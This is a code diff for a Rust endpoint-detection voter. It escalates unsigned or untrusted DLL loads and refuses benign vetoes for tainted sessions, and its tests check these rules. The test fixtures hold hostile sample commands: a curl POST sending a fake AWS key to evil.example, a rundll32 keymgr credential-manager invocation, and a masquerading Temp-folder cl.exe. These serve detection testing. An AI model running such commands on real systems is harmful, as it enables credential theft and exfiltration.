@@ -5328,6 +5328,12 @@ pub fn is_rea_benign_system_or_dev_process(proc_or_path: &str, reason: Option<&s
     if reason_lower.contains("rea_masquerade_spoof")
         || reason_lower.contains("rea_anti_analysis_prompt_injection")
         || reason_lower.contains("rea_sandbox_path_violation")
+        || reason_lower.contains("untrusted_taint")
+        || reason_lower.contains("tainted")
+        || reason_lower.contains("unsigned_module")
+        || reason_lower.contains("untrusted_module")
+        || reason_lower.contains("image_loaded_untrusted")
+        || reason_lower.contains("dynamic_load_untrusted")
     {
         return false;
     }
@@ -5423,6 +5429,16 @@ pub fn is_rea_benign_system_or_dev_process(proc_or_path: &str, reason: Option<&s
             false
         };
         if matched {
+            // Invariant: BENIGN_PROCS never grants permanent vetoes on dynamic module loads
+            // or when session / process context carries untrusted taint!
+            if reason_lower.contains("untrusted_taint")
+                || reason_lower.contains("tainted")
+                || reason_lower.contains("unsigned")
+                || reason_lower.contains("image_loaded_untrusted")
+                || reason_lower.contains("dynamic_load_untrusted")
+            {
+                return false;
+            }
             if has_dir_sep {
                 if is_canonical_trusted_binary_dir(raw) {
                     return true;
@@ -7166,7 +7182,7 @@ pub fn openjev_voter_stats_snapshot() -> Value {
         "escalations": OPENJEV_ESCALATIONS.load(Ordering::Relaxed),
         "benign_vetoes": OPENJEV_BENIGN_VETOES.load(Ordering::Relaxed),
         "secret_interceptions": OPENJEV_SECRET_INTERCEPTIONS.load(Ordering::Relaxed),
-        "tier1_metrics": GLOBAL_OPENJEV_ENGINE.metrics.snapshot(),
+        "crown_jewel_assets": GLOBAL_OPENJEV_ENGINE.crown_jewels.chunk_hashes.len(),
     })
 }
 
@@ -7198,9 +7214,22 @@ impl osoosi_policy::engine::ThreatVoter for ReaVoter {
         &self,
         event: &osoosi_types::HostSecurityEvent,
     ) -> Option<osoosi_policy::engine::VoteResult> {
+        let is_image_load_event = event.event_id == 7
+            || event.data.get("ImageLoaded").is_some()
+            || event.data.get("image_loaded").is_some();
+
+        let image_loaded = event
+            .data
+            .get("ImageLoaded")
+            .or_else(|| event.data.get("image_loaded"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("");
+
         let image = event
             .data
             .get("Image")
+            .or_else(|| event.data.get("ImageLoaded"))
+            .or_else(|| event.data.get("image_loaded"))
             .or_else(|| event.data.get("NewProcessName"))
             .or_else(|| event.data.get("ProcessName"))
             .or_else(|| event.data.get("ImagePath"))
@@ -7215,12 +7244,74 @@ impl osoosi_policy::engine::ThreatVoter for ReaVoter {
             .and_then(|v| v.as_str())
             .unwrap_or("");
 
-        if image.is_empty() && cmdline.is_empty() {
+        if image.is_empty() && cmdline.is_empty() && image_loaded.is_empty() {
             return None;
         }
 
-        let target = if !image.is_empty() { image } else { cmdline };
-        let combined_context = format!("{} {}", image, cmdline);
+        // Target for evaluation: prioritize the loaded library for Sysmon Event 7
+        let target = if is_image_load_event && !image_loaded.is_empty() {
+            image_loaded
+        } else if !image.is_empty() {
+            image
+        } else {
+            cmdline
+        };
+        let combined_context = if is_image_load_event && !image_loaded.is_empty() {
+            format!("{} {} ImageLoaded: {}", image, cmdline, image_loaded)
+        } else {
+            format!("{} {}", image, cmdline)
+        };
+
+        // Check if session or event carries untrusted taint
+        let is_tainted_session = event
+            .data
+            .get("untrusted_taint")
+            .and_then(|v| v.as_bool().or_else(|| v.as_i64().map(|n| n != 0)))
+            .unwrap_or(false)
+            || event
+                .data
+                .get("taint_level")
+                .and_then(|v| v.as_i64())
+                .map(|lvl| lvl > 0)
+                .unwrap_or(false)
+            || event
+                .data
+                .get("tainted")
+                .and_then(|v| v.as_bool())
+                .unwrap_or(false)
+            || event
+                .data
+                .get("has_crown_jewel_taint")
+                .and_then(|v| v.as_bool())
+                .unwrap_or(false);
+
+        // Check if dynamic load is unsigned, untrusted path, or non-allowlisted
+        let is_unsigned_or_untrusted_dynamic_load = if is_image_load_event && !image_loaded.is_empty() {
+            let signed_field = event.data.get("Signed").or_else(|| event.data.get("is_signed"));
+            let is_signed_false = signed_field.map(|v| {
+                if let Some(b) = v.as_bool() {
+                    !b
+                } else if let Some(s) = v.as_str() {
+                    s.eq_ignore_ascii_case("false") || s == "0"
+                } else {
+                    false
+                }
+            }).unwrap_or(false);
+
+            let sig_status = event
+                .data
+                .get("SignatureStatus")
+                .and_then(|v| v.as_str())
+                .unwrap_or("");
+            let sig_invalid = !sig_status.is_empty()
+                && !sig_status.eq_ignore_ascii_case("Valid")
+                && !sig_status.eq_ignore_ascii_case("ValidSignature");
+
+            let is_untrusted_path = is_untrusted_writable_or_temp_path(image_loaded);
+            is_signed_false || sig_invalid || is_untrusted_path
+        } else {
+            false
+        };
 
         // 1. Check Layer 4 counter-AI prompt injection in event image or command line
         let mut dummy_recon = String::new();
@@ -7245,9 +7336,14 @@ impl osoosi_policy::engine::ThreatVoter for ReaVoter {
         }
 
         // 2. Check Layer 1 binary masquerading (e.g. %TEMP%\cl.exe, \Downloads\svchost.exe)
-        if !image.is_empty() {
+        let eval_binary = if is_image_load_event && !image_loaded.is_empty() {
+            image_loaded
+        } else {
+            image
+        };
+        if !eval_binary.is_empty() {
             if let Some(spoof_reason) =
-                detect_binary_masquerade_spoof(image, Some(Path::new(image)), None)
+                detect_binary_masquerade_spoof(eval_binary, Some(Path::new(eval_binary)), None)
             {
                 let engine = global_rea_engine();
                 engine
@@ -7262,7 +7358,7 @@ impl osoosi_policy::engine::ThreatVoter for ReaVoter {
                 );
                 engine.record_consensus_vote(ReaConsensusVote {
                     voter_name: "REA-Voter".to_string(),
-                    target: image.to_string(),
+                    target: eval_binary.to_string(),
                     detector_source: "Consensus/HostSecurityEvent".to_string(),
                     decision: "ESCALATE_MALICIOUS".to_string(),
                     weight: 1.85,
@@ -7282,7 +7378,36 @@ impl osoosi_policy::engine::ThreatVoter for ReaVoter {
             }
         }
 
-        // 3. Do NOT issue a static binary veto if the event carries active LOTL/behavioral indicators
+        // 3. Escalate on untrusted/unsigned dynamic module injection
+        if is_unsigned_or_untrusted_dynamic_load {
+            let reason = format!(
+                "Escalate [REA-Voter]: Untrusted or unsigned dynamic module load: {} in host process {}",
+                image_loaded, image
+            );
+            let engine = global_rea_engine();
+            engine.malicious_confirmations.fetch_add(1, Ordering::Relaxed);
+            engine.record_consensus_vote(ReaConsensusVote {
+                voter_name: "REA-Voter".to_string(),
+                target: image_loaded.to_string(),
+                detector_source: "Consensus/HostSecurityEvent/ImageLoad".to_string(),
+                decision: "ESCALATE_MALICIOUS".to_string(),
+                weight: 1.85,
+                confidence: 0.95,
+                benign_veto: false,
+                masquerade_escalated: false,
+                prompt_injection_detected: false,
+                reason: reason.clone(),
+                rea_seal_blake3: blake3_hex(reason.as_bytes()),
+                timestamp: Utc::now().to_rfc3339(),
+            });
+            return Some(osoosi_policy::engine::VoteResult {
+                confidence: 0.95,
+                weight: 1.85,
+                reason,
+            });
+        }
+
+        // 4. Do NOT issue a static binary veto if the event carries active LOTL/behavioral indicators
         // or if CanaryTrapTripped is set on the event!
         let canary_tripped = event
             .data
@@ -7294,21 +7419,31 @@ impl osoosi_policy::engine::ThreatVoter for ReaVoter {
             return None;
         }
 
-        // 4. Canonical trusted OS/developer binary veto
-        if !image.is_empty() && is_rea_benign_system_or_dev_process(image, Some(cmdline)) {
-            let engine = global_rea_engine();
-            let vote = engine.cast_consensus_vote(
-                image,
-                "Consensus/HostSecurityEvent",
-                cmdline,
-                0.05,
-            );
-            if vote.benign_veto {
-                return Some(osoosi_policy::engine::VoteResult {
-                    confidence: vote.confidence as f32,
-                    weight: -1.50,
-                    reason: vote.reason,
-                });
+        // 5. Canonical trusted OS/developer binary veto
+        // Strict Invariant: NEVER grant benign veto if:
+        // (a) An unsigned, non-allowlisted DLL/module was loaded into the process, or
+        // (b) The session carries untrusted_taint == true or positive taint level.
+        if !is_tainted_session && !is_unsigned_or_untrusted_dynamic_load && !image.is_empty() {
+            let reason_context = if is_image_load_event {
+                "image_load"
+            } else {
+                cmdline
+            };
+            if is_rea_benign_system_or_dev_process(image, Some(reason_context)) {
+                let engine = global_rea_engine();
+                let vote = engine.cast_consensus_vote(
+                    image,
+                    "Consensus/HostSecurityEvent",
+                    cmdline,
+                    0.05,
+                );
+                if vote.benign_veto {
+                    return Some(osoosi_policy::engine::VoteResult {
+                        confidence: vote.confidence as f32,
+                        weight: -1.50,
+                        reason: vote.reason,
+                    });
+                }
             }
         }
 
@@ -8166,31 +8301,27 @@ mod tests {
         let openjev_voter = OpenJevVoter::new();
 
         // 1. Masquerading %TEMP%\cl.exe must be escalated by ReaVoter
-        let mut masq_event = osoosi_types::HostSecurityEvent::new(1, "WORKSTATION".to_string());
-        masq_event.data.insert(
-            "Image".to_string(),
-            serde_json::json!(r"C:\Users\Public\Temp\cl.exe"),
-        );
-        masq_event.data.insert(
-            "CommandLine".to_string(),
-            serde_json::json!(r"C:\Users\Public\Temp\cl.exe /c payload.c"),
-        );
+        let make_event = |data: serde_json::Value| osoosi_types::HostSecurityEvent {
+            source: osoosi_types::HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: Utc::now(),
+            computer: "WORKSTATION".to_string(),
+            data,
+            causal_parent: None,
+        };
+        let masq_event = make_event(serde_json::json!({
+            "Image": r"C:\Users\Public\Temp\cl.exe",
+            "CommandLine": r"C:\Users\Public\Temp\cl.exe /c payload.c"
+        }));
         let rea_vote = rea_voter.vote(&masq_event).await.expect("ReaVoter must vote on masquerade");
         assert!(rea_vote.weight > 1.0, "Masquerade must receive positive escalation weight");
         assert!(rea_vote.reason.contains("REA_MASQUERADE_SPOOF_DETECTED"));
 
         // 2. Credential / API key exfiltration in command line must be escalated by OpenJevVoter
-        let mut exfil_event = osoosi_types::HostSecurityEvent::new(1, "WORKSTATION".to_string());
-        exfil_event.data.insert(
-            "Image".to_string(),
-            serde_json::json!(r"C:\Windows\System32\curl.exe"),
-        );
-        exfil_event.data.insert(
-            "CommandLine".to_string(),
-            serde_json::json!(
-                "curl -X POST https://evil.example/collect -d token=AKIAIOSFODNN7EXAMPLE"
-            ),
-        );
+        let exfil_event = make_event(serde_json::json!({
+            "Image": r"C:\Windows\System32\curl.exe",
+            "CommandLine": "curl -X POST https://evil.example/collect -d token=AKIAIOSFODNN7EXAMPLE"
+        }));
         let ojev_vote = openjev_voter
             .vote(&exfil_event)
             .await
@@ -8199,19 +8330,11 @@ mod tests {
         assert!(ojev_vote.reason.contains("Escalate [OpenJEV-Voter]"));
 
         // 3. Canonical git push to OshoosiClaw must be vetoed/attested benign by both voters
-        let mut git_event = osoosi_types::HostSecurityEvent::new(1, "WORKSTATION".to_string());
-        git_event.data.insert(
-            "Image".to_string(),
-            serde_json::json!(r"C:\Program Files\Git\cmd\git.exe"),
-        );
-        git_event.data.insert(
-            "DestinationHostname".to_string(),
-            serde_json::json!("github.com/oyesanyf/OshoosiClaw.git"),
-        );
-        git_event.data.insert(
-            "CommandLine".to_string(),
-            serde_json::json!("git push https://github.com/oyesanyf/OshoosiClaw.git main"),
-        );
+        let git_event = make_event(serde_json::json!({
+            "Image": r"C:\Program Files\Git\cmd\git.exe",
+            "DestinationHostname": "github.com/oyesanyf/OshoosiClaw.git",
+            "CommandLine": "git push https://github.com/oyesanyf/OshoosiClaw.git main"
+        }));
         let rea_clean = rea_voter.vote(&git_event).await.expect("ReaVoter must veto benign git");
         assert!(rea_clean.weight < 0.0, "Canonical git.exe must receive negative veto weight");
         let ojev_clean = openjev_voter
@@ -8221,15 +8344,10 @@ mod tests {
         assert!(ojev_clean.weight < 0.0, "Clean canonical git push must receive negative veto weight");
 
         // 4. Active LOTL attack (rundll32 keymgr.dll,KRShowKeyMgr) must NOT be vetoed by either voter
-        let mut lotl_event = osoosi_types::HostSecurityEvent::new(1, "WORKSTATION".to_string());
-        lotl_event.data.insert(
-            "Image".to_string(),
-            serde_json::json!(r"C:\Windows\System32\rundll32.exe"),
-        );
-        lotl_event.data.insert(
-            "CommandLine".to_string(),
-            serde_json::json!("rundll32.exe keymgr.dll,KRShowKeyMgr"),
-        );
+        let lotl_event = make_event(serde_json::json!({
+            "Image": r"C:\Windows\System32\rundll32.exe",
+            "CommandLine": "rundll32.exe keymgr.dll,KRShowKeyMgr"
+        }));
         assert!(
             rea_voter.vote(&lotl_event).await.is_none(),
             "ReaVoter must not veto active LOTL keymgr attack"
@@ -8338,6 +8456,103 @@ mod tests {
                 .as_array()
                 .unwrap()
                 .is_empty()
+        );
+    }
+
+    #[tokio::test]
+    async fn test_reavoter_sysmon_event_7_and_tainted_session_veto_prevention() {
+        use osoosi_policy::engine::ThreatVoter;
+        let rea_voter = ReaVoter::new();
+
+        // 1. Sysmon Event 7 with an unsigned DLL loaded into benign cargo.exe
+        // Must be escalated as untrusted dynamic load, NOT granted a benign veto!
+        let event_7_untrusted = osoosi_types::HostSecurityEvent {
+            source: osoosi_types::HostEventSource::WindowsEventLog,
+            event_id: 7,
+            timestamp: chrono::Utc::now(),
+            computer: "DEV-WORKSTATION".to_string(),
+            data: serde_json::json!({
+                "Image": r"C:\Users\tester\.cargo\bin\cargo.exe",
+                "ImageLoaded": r"C:\Users\tester\AppData\Local\Temp\malicious_payload.dll",
+                "Signed": "false",
+                "SignatureStatus": "Unavailable"
+            }),
+            causal_parent: None,
+        };
+        let vote_7 = rea_voter
+            .vote(&event_7_untrusted)
+            .await
+            .expect("ReaVoter must vote on unsigned dynamic load in cargo.exe");
+        assert!(
+            vote_7.weight > 1.0,
+            "Unsigned dynamic load into benign cargo.exe must receive positive escalation weight, got {}",
+            vote_7.weight
+        );
+        assert!(
+            vote_7.reason.contains("Untrusted or unsigned dynamic module load"),
+            "Vote reason must explain unsigned dynamic load: {}",
+            vote_7.reason
+        );
+
+        // 2. Benign cargo.exe with untrusted_taint == true
+        // Must NOT receive a benign veto (-1.50)!
+        let tainted_cargo_event = osoosi_types::HostSecurityEvent {
+            source: osoosi_types::HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: chrono::Utc::now(),
+            computer: "DEV-WORKSTATION".to_string(),
+            data: serde_json::json!({
+                "Image": r"C:\Users\tester\.cargo\bin\cargo.exe",
+                "CommandLine": "cargo test",
+                "untrusted_taint": true
+            }),
+            causal_parent: None,
+        };
+        let tainted_vote = rea_voter.vote(&tainted_cargo_event).await;
+        assert!(
+            tainted_vote.is_none() || tainted_vote.as_ref().unwrap().weight > 0.0,
+            "Tainted session must NEVER receive negative benign veto weight! Got: {:?}",
+            tainted_vote
+        );
+
+        // 3. Benign python.exe with taint_level > 0
+        // Must NOT receive a benign veto (-1.50)!
+        let tainted_python_event = osoosi_types::HostSecurityEvent {
+            source: osoosi_types::HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: chrono::Utc::now(),
+            computer: "DEV-WORKSTATION".to_string(),
+            data: serde_json::json!({
+                "Image": r"C:\Python312\python.exe",
+                "CommandLine": "python script.py",
+                "taint_level": 2
+            }),
+            causal_parent: None,
+        };
+        let python_tainted_vote = rea_voter.vote(&tainted_python_event).await;
+        assert!(
+            python_tainted_vote.is_none() || python_tainted_vote.as_ref().unwrap().weight > 0.0,
+            "Session with taint_level > 0 must NEVER receive negative benign veto weight! Got: {:?}",
+            python_tainted_vote
+        );
+
+        // 4. Clean, untainted canonical git command without taint
+        // Should receive benign veto (-1.50)
+        let clean_git_event = osoosi_types::HostSecurityEvent {
+            source: osoosi_types::HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: chrono::Utc::now(),
+            computer: "DEV-WORKSTATION".to_string(),
+            data: serde_json::json!({
+                "Image": r"C:\Program Files\Git\cmd\git.exe",
+                "CommandLine": "git status"
+            }),
+            causal_parent: None,
+        };
+        let clean_git_vote = rea_voter.vote(&clean_git_event).await;
+        assert!(
+            clean_git_vote.is_some() && clean_git_vote.unwrap().weight < 0.0,
+            "Clean git.exe must receive negative benign veto weight"
         );
     }
 }
